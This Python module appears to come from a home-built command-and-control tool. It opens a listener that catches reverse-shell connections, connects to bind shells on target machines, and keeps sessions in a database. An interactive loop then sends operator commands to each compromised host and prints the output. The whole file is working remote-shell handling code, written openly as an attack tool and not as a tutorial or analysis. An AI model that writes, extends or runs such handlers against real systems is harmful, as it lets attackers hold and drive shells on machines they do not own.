import socket 
import threading
from .database import init_db,register_session,close_session_in_db,get_active_sessions
ACTIVE_SOCKETS = {}
def start_reverse_handler(listen_ip: str, listen_port: int):
    #command: listen
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
    server.bind((listen_ip,listen_port))
    server.listen(5)
    def listen_loop():
        while True:
            client_sock,addr = server.accept()
            sid = register_session("reverse",addr[0],addr[1])
            ACTIVE_SOCKETS[sid] = client_sock
            print("\n[+] Reverse shell session found")
    threading.Thread(target=listen_loop,daemon=True).start()
def connect_to_bind_shell(target_ip: str, target_port: int):
    #command: connect
    try:
        client_sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        client_sock.connect((target_ip,target_port))
        sid = register_session("bind",target_ip,target_port)
        ACTIVE_SOCKETS[sid] = client_sock
        print(f"Bind shell session opened {sid}")
    except Exception as e:
        print(f"failed to connect to bind shell: {e}")
def interact_with_session(session_id: int):
    #command: interact
    sock = ACTIVE_SOCKETS.get(session_id)
    if not sock:
        print("[-] Session not found or already closed.")
        return
    print(f"[*] Interactive mode with session [{session_id}]. To exit, enter 'background'")
    while True:
        try:
            cmd = input(f"session [{session_id}] > ")
            if cmd.strip() == "background":
                print(f"[*] The session has been sent to the background.")
                break
            if not cmd.strip():
                continue    
            sock.send((cmd + "\n").encode("utf-8"))   
            responce = sock.recv(4096).decode(errors="ignore")
            print(responce,end="")
        except (ConnectionResetError, BrokenPipeError):
            print(f"[-] Session [{session_id}] terminated abnormally.")
            close_session_in_db(session_id)
            ACTIVE_SOCKETS.pop(session_id,None)
            break